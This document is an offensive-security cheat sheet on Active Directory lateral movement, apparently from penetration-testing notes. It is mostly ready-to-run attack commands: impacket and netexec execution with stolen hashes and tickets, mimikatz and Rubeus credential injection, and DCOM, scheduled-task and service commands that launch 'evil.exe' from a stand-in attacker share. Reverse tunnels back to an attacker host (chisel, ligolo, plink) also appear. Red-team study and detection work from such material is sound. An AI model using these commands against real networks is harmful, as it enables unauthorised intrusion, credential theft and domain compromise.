# AD - Lateral Movement

## Table of Contents
- [Credential Material Decision Table](#credential-material-decision-table)
- [Local Admin Mapping](#local-admin-mapping)
- [Session Hunting](#session-hunting)
- [PsExec](#psexec)
- [SmbExec](#smbexec)
- [AtExec](#atexec)
- [WmiExec](#wmiexec)
- [DcomExec](#dcomexec)
- [WinRM / Evil-WinRM](#winrm--evil-winrm)
- [RDP (Restricted Admin, PtH over RDP)](#rdp-restricted-admin-pth-over-rdp)
- [SSH on Windows](#ssh-on-windows)
- [WMI (Native)](#wmi-native)
- [COM / DCOM Lateral Movement](#com--dcom-lateral-movement)
- [Scheduled Tasks](#scheduled-tasks)
- [Services](#services)
- [Pass-the-Hash](#pass-the-hash)
- [OverPass-the-Hash / Pass-the-Key](#overpass-the-hash--pass-the-key)
- [Pass-the-Ticket](#pass-the-ticket)
- [Token Impersonation and runas /netonly](#token-impersonation-and-runas-netonly)
- [Pivoting](#pivoting)
- [Port Forwarding on Windows](#port-forwarding-on-windows)

For Kerberos delegation, S4U, and roasting see [kerberos.md](kerberos.md). For post-DA persistence see [domain-dominance.md](domain-dominance.md). For cross-forest movement see [trusts.md](trusts.md).

---

## Credential Material Decision Table

| I have... | Works for | Notes |
|---|---|---|
| Cleartext password | Everything (NTLM + Kerberos) | Most flexible. Derive NT hash/AES key from it. |
| NT hash | PtH: psexec/smbexec/wmiexec/atexec/wcmiexec, nxc, evil-winrm, RDP (restricted admin) | NTLM auth only. Cannot use NTLM PtH if server enforces Kerberos-only. |
| NT hash | OverPtH -> request TGT -> Kerberos everywhere | RC4 TGT unless AES keys known. Fails if RC4 disabled. |
| AES128/256 key | Pass-the-Key -> TGT (AES) | Preferred where RC4 (etype 23) is disabled. |
| TGT (.ccache/.kirbi) | PtT: any Kerberos service (SMB, LDAP, HTTP, WinRM) with `-k` | Must target by hostname/FQDN, never IP. |
| TGS/service ticket | PtT for that one service/SPN only | Silver-ticket style. |
| DPAPI masterkey / creds | Decrypt saved creds -> cleartext | See credential-access. |
| Local admin on box + LSASS | Dump more hashes/tickets -> repeat | Token impersonation for logged-on users. |

Key rule: **NTLM (PtH) authenticates to an IP or hostname; Kerberos (PtT/OverPtH) requires the target's SPN, so always use the FQDN/hostname, not the IP.** If SMB signing or "NTLM disabled" blocks you, pivot to Kerberos.

---

## Local Admin Mapping
Find where a credential grants local admin before spending it.

```bash
# Linux - netexec sprays and marks (Pwn3d!) where local admin
nxc smb 10.10.10.0/24 -u user -p 'Password1' -d domain.local
nxc smb 10.10.10.0/24 -u user -H <NThash> --local-auth      # local SAM account, not domain
nxc smb targets.txt -u Administrator -H <NThash> --local-auth

# Enumerate admin access across the domain from creds
nxc smb 10.10.10.0/24 -u user -p 'Password1' -d domain.local -x whoami
```
```powershell
# Windows - PowerView
Find-LocalAdminAccess -Domain domain.local          # where does current user have local admin
Invoke-CheckLocalAdminAccess -ComputerName srv01
Test-AdminAccess -ComputerName srv01
```
BloodHound: `AdminTo` / `First Degree Local Admin Rights` edges answer this without touching the network.

## Session Hunting
Locate where a target user is logged on so you can steal their token/creds.

```powershell
# PowerView
Find-DomainUserLocation -UserIdentity targetadmin           # hunt one user
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"  # hunt any DA
Get-NetSession -ComputerName srv01
Get-NetLoggedon -ComputerName srv01
Get-NetRDPSession -ComputerName srv01
```
```bash
# netexec - loggedon-users / sessions modules
nxc smb 10.10.10.0/24 -u user -p 'pass' -d domain.local --loggedon-users
nxc smb 10.10.10.0/24 -u user -p 'pass' -d domain.local --sessions
```

---

## PsExec
Uploads a service binary to `ADMIN$`, registers + starts a service, communicates over a named pipe. **Loudest** method; drops an artifact on disk and creates a service. Needs local admin (SMB `ADMIN$` + `SVCCTL`). SYSTEM shell.

```bash
# impacket
psexec.py domain/user:'Password1'@10.10.10.10
psexec.py -hashes :<NThash> domain/user@10.10.10.10           # PtH
psexec.py domain/user@target.domain.local -k -no-pass         # Kerberos (needs KRB5CCNAME)
```
```bash
# netexec (uses its own exec method; --exec-method {smbexec,atexec,mmcexec})
nxc smb 10.10.10.10 -u user -p 'Password1' -x 'whoami' --exec-method smbexec
```
Artifacts: service creation (Event 7045), binary in `C:\Windows\`, named pipe. impacket randomizes the service/binary name.

## SmbExec
Like psexec but **no binary dropped** — creates a service that runs a command via `cmd.exe`, output relayed over SMB. Semi-interactive (each command spawns a service). Quieter on disk, still creates services.

```bash
smbexec.py domain/user:'Password1'@10.10.10.10
smbexec.py -hashes :<NThash> domain/user@10.10.10.10
smbexec.py domain/user@target.domain.local -k -no-pass
```
Artifacts: repeated service creation (7045) per command, output file in `C:\Windows\Temp`.

## AtExec
Runs a single command via the **Task Scheduler** (ATSVC named pipe). Needs local admin. Good when service creation is monitored but tasks are not.

```bash
atexec.py domain/user:'Password1'@10.10.10.10 "whoami"
atexec.py -hashes :<NThash> domain/user@10.10.10.10 "systeminfo"
atexec.py domain/user@target.domain.local -k -no-pass "whoami"
```
Artifacts: scheduled task create/delete (Event 4698/4699, 106/141 in TaskScheduler op log).

## WmiExec
Executes via **WMI** (`Win32_Process.Create`) over DCOM (135) + a random high port; output via SMB (`ADMIN$`). **No service, no binary** on disk -> stealthier. Semi-interactive. Needs local admin, DCOM reachable.

```bash
wmiexec.py domain/user:'Password1'@10.10.10.10
wmiexec.py -hashes :<NThash> domain/user@10.10.10.10          # PtH
wmiexec.py domain/user@target.domain.local -k -no-pass        # Kerberos
wmiexec.py domain/user:'Password1'@10.10.10.10 -silentcommand -nooutput   # no ADMIN$ write
```
```bash
nxc wmi 10.10.10.10 -u user -p 'Password1' -x 'whoami'
```
Artifacts: process created under `WmiPrvSE.exe` parent, Event 4688.

## DcomExec
Abuses DCOM objects (`MMC20.Application`, `ShellWindows`, `ShellBrowserWindow`) for execution. Alternative when WMI is filtered. Needs local admin + DCOM.

```bash
dcomexec.py domain/user:'Password1'@10.10.10.10
dcomexec.py -object MMC20 domain/user:'Password1'@10.10.10.10       # -object {ShellWindows,ShellBrowserWindow,MMC20}
dcomexec.py -hashes :<NThash> domain/user@10.10.10.10
```
Artifacts: execution under `mmc.exe` / `explorer.exe` parent.

## WinRM / Evil-WinRM
WS-Management over 5985 (HTTP) / 5986 (HTTPS). Needs membership in **Remote Management Users** or local admin. Clean, interactive, no SMB needed. PtH supported.

```bash
evil-winrm -i 10.10.10.10 -u user -p 'Password1'
evil-winrm -i 10.10.10.10 -u user -H <NThash>                 # PtH
evil-winrm -i 10.10.10.10 -u user -p 'Password1' -s ./scripts -e ./exes   # script/exe menu
# Kerberos (needs valid krb5.conf + KRB5CCNAME ccache)
evil-winrm -i target.domain.local -r DOMAIN.LOCAL
```
```bash
nxc winrm 10.10.10.10 -u user -p 'Password1'                  # test/spray
nxc winrm 10.10.10.10 -u user -H <NThash> -x 'whoami'
```
Artifacts: Event 4624 logon type 3, WSMAN operational log.

## RDP (Restricted Admin, PtH over RDP)
TCP 3389. Normal RDP needs cleartext. **Restricted Admin mode** allows PtH (no cleartext) but must be enabled on the target and disables single-sign-on to downstream (network logon).

```bash
# Enable Restricted Admin on target (needs admin) - registry
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
# via netexec remotely
nxc smb 10.10.10.10 -u admin -H <NThash> -M rdp -o ACTION=enable
```
```bash
# Linux - PtH over RDP with xfreerdp (requires Restricted Admin enabled)
xfreerdp /v:10.10.10.10 /u:Administrator /pth:<NThash> /cert-ignore
xfreerdp /v:10.10.10.10 /u:user /p:'Password1' /cert-ignore /dynamic-resolution
# Windows - mimikatz injects hash then launch mstsc /restrictedadmin
sekurlsa::pth /user:Administrator /domain:. /ntlm:<NThash> /run:"mstsc.exe /restrictedadmin"
```
Check if RDP is open and who can use it: `nxc rdp 10.10.10.0/24 -u user -p 'pass'`.

## SSH on Windows
OpenSSH server (Windows 10/Server 2019+). Password or key auth; not domain-integrated by default but domain creds work if configured.

```bash
ssh domain\\user@10.10.10.10            # backslash escaped
sshpass -p 'Password1' ssh user@10.10.10.10
```
Useful as a stable pivot host and for `ssh -D` SOCKS (see pivoting).

## WMI (Native)
From a Windows foothold without impacket.

```powershell
# Remote process creation
$cred = Get-Credential
Invoke-WmiMethod -ComputerName srv01 -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\out.txt" -Credential $cred
Invoke-Command -ComputerName srv01 -ScriptBlock { whoami } -Credential $cred   # WinRM/PSRemoting
Enter-PSSession -ComputerName srv01 -Credential $cred
```
```cmd
:: Native wmic (deprecated but often present)
wmic /node:srv01 /user:DOMAIN\user /password:Password1 process call create "cmd /c whoami"
```

## COM / DCOM Lateral Movement
Instantiate a remote DCOM object and drive its methods to execute — no service, no PsExec binary. From a Windows foothold, activate the object on the target with `[activator]::CreateInstance([type]::GetTypeFromProgID(<ProgID>,<target>))` (uses the *current* token; run under `runas /netonly` or an injected ticket to use other creds). Needs local admin on the target + DCOM (135 + dynamic RPC). The impacket equivalent is `dcomexec.py` (see [DcomExec](#dcomexec)) for the same objects from Linux.

```powershell
# MMC20.Application - ExecuteShellCommand (classic, no hardening by default)
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.10"))
$c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c \\attacker\share\evil.exe","7")

# ShellWindows  (CLSID 9BA05972-F6A8-11CF-A442-00A0C90A8F39) - via CLSID, no ProgID
$t="10.10.10.10"
$sw=[activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39",$t))
$item=$sw.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)

# ShellBrowserWindow (CLSID C08AFD90-F2A1-11D1-8455-00A0C91F3880) - same Document.Application.ShellExecute
$sbw=[activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880",$t))
$sbw.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)

# Excel.Application DCOM - Excel4 macro / RegisterXLL / DDEInitiate to run a command (Office required on target)
$xl=[activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application",$t))
$xl.DDEInitiate("cmd","/c \\attacker\share\evil.exe")
# Outlook.Application DCOM -> CreateObject("WScript.Shell").Run(...) via the Outlook object model
```
```bash
# impacket equivalent from Linux
dcomexec.py -object MMC20 domain/user:'Password1'@10.10.10.10          # or ShellWindows / ShellBrowserWindow
```
Detection footprint: child process spawned under `mmc.exe` (MMC20), `explorer.exe` (ShellWindows/ShellBrowserWindow), or `excel.exe`/`outlook.exe`; DCOM/RPC activation (Event 4624 type 3 + `RPC/DCOM` telemetry). Remediation-hardened hosts remove the default `ExecuteShellCommand` LaunchPermission — try alternate objects if one fails.

## Scheduled Tasks
Native remote task creation for execution/persistence. Needs admin.

```cmd
schtasks /create /s srv01 /u DOMAIN\admin /p Password1 /tn "Updater" /tr "cmd /c C:\evil.exe" /sc onstart /ru SYSTEM
schtasks /run /s srv01 /u DOMAIN\admin /p Password1 /tn "Updater"
schtasks /delete /s srv01 /tn "Updater" /f
```

## Services
Create/modify a service to run as SYSTEM. Needs admin (SC_MANAGER). Loud (Event 7045).

```cmd
sc \\srv01 create Updater binPath= "cmd /c C:\evil.exe" start= auto
sc \\srv01 start Updater
sc \\srv01 delete Updater
```
```bash
nxc smb 10.10.10.10 -u admin -H <NThash> -M services         # enumerate/abuse services
```

---

## Pass-the-Hash
Authenticate with the NT hash instead of the password over **NTLM**. Works against local SAM accounts and domain accounts where NTLM is allowed.

- Works when: target accepts NTLM, you have the NT (RC4) hash, account is local admin (for exec methods) or has the needed rights.
- Fails when: server enforces Kerberos-only / "NTLM disabled", or you only have an AES key (AES has no NTLM equivalent — use pass-the-key).
- **NTLM vs Kerberos:** NTLM binds to the machine you point at (IP is fine). Kerberos binds to the SPN, so PtH does not apply — you convert the hash into a TGT (OverPtH) and use `-k`.

```bash
# impacket / nxc / evil-winrm all take -hashes :NT or -H NT
psexec.py -hashes :<NThash> domain/user@10.10.10.10
nxc smb 10.10.10.10 -u user -H <NThash>
evil-winrm -i 10.10.10.10 -u user -H <NThash>
# full LM:NT if you have LM
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> domain/user@10.10.10.10
```
```
:: Windows - mimikatz spawns a process with the hash injected
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<NThash> /run:"cmd.exe"
```

## OverPass-the-Hash / Pass-the-Key
Turn an NT hash (RC4) or AES key into a **Kerberos TGT**, then use Kerberos. Bypasses "NTLM disabled". Prefer AES keys where RC4 (etype 23) is disabled.

```bash
# impacket getTGT - request TGT with hash or AES key -> writes .ccache
getTGT.py domain.local/user -hashes :<NThash>
getTGT.py domain.local/user -aesKey <aes256hexkey>
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain.local/user@target.domain.local
nxc smb target.domain.local -u user -k --use-kcache
```
```
:: Windows - Rubeus asktgt
Rubeus.exe asktgt /user:user /rc4:<NThash> /domain:domain.local /ptt
Rubeus.exe asktgt /user:user /aes256:<aes256key> /domain:domain.local /ptt /nowrap
:: mimikatz (pass-the-key)
sekurlsa::pth /user:user /domain:domain.local /aes256:<aes256key> /run:cmd.exe
```

## Pass-the-Ticket
Inject an existing TGT/TGS and use it. Target by **hostname/FQDN**.

```bash
# Linux - convert kirbi<->ccache if needed
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/ticket.ccache
klist
psexec.py -k -no-pass target.domain.local
smbclient.py -k -no-pass target.domain.local
```
```
:: Windows - Rubeus / mimikatz
Rubeus.exe ptt /ticket:ticket.kirbi
Rubeus.exe ptt /ticket:<base64blob>
kerberos::ptt ticket.kirbi              # mimikatz
klist                                    # verify cached ticket
```
Common error: `KRB_AP_ERR_MODIFIED` / clock skew -> sync time: `sudo ntpdate <DC>` or `sudo rdate -n <DC>`.

## Token Impersonation and runas /netonly
Reuse the identity of a logged-on user or start a process with alternate network creds.

```
:: mimikatz - steal/impersonate a token
token::list
token::elevate                          # to SYSTEM
token::elevate /domainadmin             # impersonate any logged-on DA token
:: Incognito (Meterpreter)
list_tokens -u
impersonate_token "DOMAIN\\admin"
```
```cmd
:: runas /netonly - local process stays as you, but NETWORK auth uses supplied creds.
:: Password is NOT validated locally; wrong creds only fail on the wire.
runas /netonly /user:DOMAIN\admin "cmd.exe"
:: Then use Kerberos/NTLM from that shell against remote hosts.
```
Use `runas /netonly` after `kinit`/ccache-less situations to graft creds onto a GUI/console session without a domain-joined box.

---

## Pivoting
Reach segmented networks through a foothold. Relay-free — pure tunneling.

```bash
# ligolo-ng (preferred: full TUN interface, no proxychains needed)
# --- attacker (proxy/relay) ---
./proxy -selfcert                                    # start listener :11601
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
sudo ip route add 10.10.20.0/24 dev ligolo           # route target subnet into tunnel
# --- on foothold (agent) ---
./agent -connect <attacker-ip>:11601 -ignore-cert
# in ligolo proxy console: session -> start
```
```bash
# chisel - reverse SOCKS
# server (attacker):
chisel server -p 8000 --reverse
# client (foothold):
./chisel client <attacker-ip>:8000 R:socks           # exposes SOCKS5 on attacker :1080
```
```bash
# sshuttle - VPN-like over SSH (no proxychains), needs SSH to foothold
sshuttle -r user@10.10.10.10 10.10.20.0/24 --ssh-cmd "ssh -i key"
# ssh dynamic SOCKS
ssh -D 1080 user@10.10.10.10                         # SOCKS5 on :1080
```
```bash
# proxychains + impacket through the tunnel (edit /etc/proxychains.conf: socks5 127.0.0.1 1080)
proxychains psexec.py domain/user:'pass'@10.10.20.5
# Kerberos through a proxy: use FQDN + -k, point krb5.conf DC to a routable name/IP
proxychains psexec.py -k -no-pass target.domain.local
proxychains nxc smb 10.10.20.0/24 -u user -p 'pass'
```
```bash
# netexec built-in SOCKS server (spawns SOCKS from authenticated sessions)
nxc smb 10.10.20.0/24 -u user -p 'pass' -d domain.local --socks
```
Note: SOCKS handles TCP only. For ligolo, the TUN route avoids proxychains DNS/UDP quirks — best for Kerberos where DNS matters.

## Port Forwarding on Windows
Native `netsh portproxy` when you cannot drop a tunneling binary. Needs admin. Requires IP Helper service.

```cmd
:: forward local :3389 on the pivot to an internal host
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.20.5
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0
:: open the firewall for the listener
netsh advfirewall firewall add rule name="pp" dir=in action=allow protocol=TCP localport=3389
```
```
:: plink reverse tunnel from Windows foothold
plink.exe -ssh -R 3389:10.10.20.5:3389 user@attacker-ip -pw pass
```
